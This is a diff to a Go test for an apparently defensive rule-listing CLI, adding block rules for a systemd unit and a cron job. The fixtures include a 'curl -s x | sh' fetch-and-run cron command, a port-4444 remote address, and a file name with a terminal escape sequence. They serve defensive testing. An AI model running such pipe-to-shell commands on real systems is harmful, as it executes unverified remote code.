@@ -59,9 +59,13 @@ func TestRules_ListRevokeCLI(t *testing.T) {
 	}
 	a := rules.Rule{Kind: "remote", Addr: netip.MustParseAddr("203.0.113.9"), Port: 4444, Proto: "tcp", From: "web01"}
 	b := rules.Rule{Kind: "hash", SHA256: strings.Repeat("ab", 32), Exe: "/tmp/.x\x1b[2J", From: "db01"}
+	u := rules.Rule{Kind: "unit", Unit: "evil.service", SHA256: strings.Repeat("cd", 32), From: "web01"}
+	c := rules.Rule{Kind: "cron", Command: "curl -s x | sh", From: "web01"}
 	a.SetID()
 	b.SetID()
-	e, _ := rules.Sign(&rules.Set{Version: 4, Rules: []rules.Rule{a, b}}, key)
+	u.SetID()
+	c.SetID()
+	e, _ := rules.Sign(&rules.Set{Version: 4, Rules: []rules.Rule{a, b, u, c}}, key)
 	raw, _ := rules.Marshal(e)
 	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
 	defer cancel()
@@ -74,7 +78,8 @@ func TestRules_ListRevokeCLI(t *testing.T) {
 		t.Fatalf("list: %d %s", code, se.String())
 	}
 	out := so.String()
-	for _, want := range []string{"version 4", a.ID + " remote 203.0.113.9:4444/tcp web01", b.ID + " hash " + b.SHA256} {
+	for _, want := range []string{"version 4", a.ID + " remote 203.0.113.9:4444/tcp web01", b.ID + " hash " + b.SHA256,
+		u.ID + " unit evil.service@" + u.SHA256 + " web01", c.ID + ` cron "curl -s x | sh" web01`} {
 		if !strings.Contains(out, want) {
 			t.Errorf("no %q in\n%s", want, out)
 		}
